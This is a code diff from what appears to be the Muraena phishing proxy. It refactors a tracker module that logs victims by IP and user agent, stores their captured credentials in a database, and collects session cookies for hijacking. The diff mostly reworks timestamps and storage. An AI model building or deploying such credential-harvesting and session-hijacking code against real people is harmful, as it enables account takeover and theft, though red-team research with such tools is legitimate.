@@ -4,13 +4,13 @@ import (
 	//"encoding/json"
 	"fmt"
 	"github.com/muraenateam/muraena/core/db"
+	"github.com/muraenateam/muraena/log"
 	"net/http"
 	"net/url"
 	"path"
 	"path/filepath"
 	"regexp"
 	"strings"
-	"sync"
 	"time"
 
 	"github.com/evilsocket/islazy/tui"
@@ -40,7 +40,7 @@ type Tracker struct {
 	Identifier     string
 	ValidatorRegex *regexp.Regexp
 
-	Victims sync.Map
+	//Victims sync.Map
 }
 
 // Trace object structure
@@ -266,8 +266,8 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 	request.Header.Set("If-Range", t.ID)
 
 	// Check if the Trace ID is bind to an existing victim
-	v, err := module.GetVictim(t)
-	if err != nil {
+	v, _ := module.GetVictim(t)
+	if v.ID == "" {
 
 		// Tracking IP
 		IPSource := request.RemoteAddr
@@ -280,7 +280,8 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 			IP:           IPSource,
 			UA:           request.UserAgent(),
 			RequestCount: 1,
-			FirstSeen:    time.Now().String(),
+			FirstSeen:    time.Now().UTC().Format("2006-01-02 15:04:05"),
+			LastSeen:     time.Now().UTC().Format("2006-01-02 15:04:05"),
 		}
 
 		module.Push(v)
@@ -288,6 +289,9 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 
 	} else {
 		// This Victim is well known, increasing the number of requests processed
+		// TODO handle this with redis HINCRBY
+
+		// TODO update also the LastSeen time
 		v.RequestCount++
 	}
 
@@ -384,7 +388,7 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 						creds := &db.VictimCredential{
 							Key:   p.Label,
 							Value: value,
-							Time:  time.Now().String(),
+							Time:  time.Now().UTC().Format("2006-01-02 15:04:05"),
 						}
 
 						err := db.StoreVictimCreds(victim.ID, creds)
@@ -429,6 +433,7 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 		var sessCookies []necrobrowser.SessionCookie
 		var cookies string
 
+		log.Info(" TODO refactor me to fetch from redis")
 		// get all the cookies from the CookieJar
 		// TODO re-enable this using REDIS instead
 		//victim.Cookies.Range(func(k, v interface{}) bool {
